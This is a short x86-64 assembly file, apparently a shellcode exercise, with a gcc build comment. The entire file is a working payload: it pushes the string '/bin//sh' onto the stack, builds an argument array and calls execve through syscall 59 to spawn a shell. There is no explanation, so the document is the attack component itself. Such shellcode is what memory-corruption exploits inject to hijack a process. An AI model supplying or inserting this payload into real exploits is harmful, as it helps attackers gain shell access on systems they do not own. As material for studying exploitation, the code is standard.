// gcc -nostdlib shellcode.s -o shellcode
    .intel_syntax noprefix
    .global _start 

_start:
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f6e69622f
    push rax 
    mov rdi, rsp
    push rdx
    push rdi 
    mov rsi, rsp 
    lea rax, [rdx + 59]
    syscall
